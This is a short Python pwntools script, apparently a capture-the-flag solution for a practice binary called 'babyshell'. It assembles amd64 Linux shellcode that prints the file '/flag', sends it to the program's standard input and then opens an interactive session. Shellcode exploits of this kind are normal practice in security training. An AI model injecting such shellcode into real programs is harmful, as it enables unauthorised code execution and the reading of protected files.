from pwn import *
import sys, os

class io:
    @classmethod
    def connect(cls):
        binary = sys.argv[0].split('.py')[0]
        if '/' in binary:
            binary = binary.split('/')[-1]
        binary = '/pwn/babyshell/' + binary
        cls.io = process(binary)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def block_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__


def main():

    pl = shellcraft.amd64.linux.cat('/flag')
    pl = asm(pl, arch = 'amd64', os = 'linux')

    io.connect()
    io.readuntil('bytes from stdin into')
    io.readuntil('\n')
    io.sendline(pl)

if __name__ == '__main__':
    main()
    io.interactive()
